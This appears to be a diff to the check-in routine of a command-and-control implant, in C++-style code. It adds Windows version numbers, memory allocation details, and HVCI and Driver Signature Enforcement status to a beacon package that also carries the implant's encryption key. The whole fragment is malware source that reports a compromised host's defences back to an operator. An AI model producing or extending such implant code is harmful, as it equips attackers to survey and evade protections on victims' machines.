@@ -91,8 +91,20 @@ auto DECLFN Transport::Checkin(
     Self->Pkg->Int32( CheckinPkg, Self->Machine.PercentRAM );
     Self->Pkg->Int32( CheckinPkg, Self->Machine.ProcessorsNbr );
 
+    // win version
+    Self->Pkg->Int32( CheckinPkg, Self->Machine.OsMjrV );
+    Self->Pkg->Int32( CheckinPkg, Self->Machine.OsMnrV );
+    Self->Pkg->Int32( CheckinPkg, Self->Machine.OsBuild );
+
+    // 
+    Self->Pkg->Int32( CheckinPkg, Self->Machine.AllocGran );
+    Self->Pkg->Int32( CheckinPkg, Self->Machine.PageSize );
+    
+
     // security informations
     Self->Pkg->Int32( CheckinPkg, Self->Machine.CfgEnabled );
+    Self->Pkg->Int32( CheckinPkg, Self->Machine.HhvciEnabled );
+    Self->Pkg->Int32( CheckinPkg, Self->Machine.DseEnabled );
 
     // encryption key
     Self->Pkg->Bytes( CheckinPkg, Self->Crp->LokKey, sizeof( Self->Crp->LokKey ) );
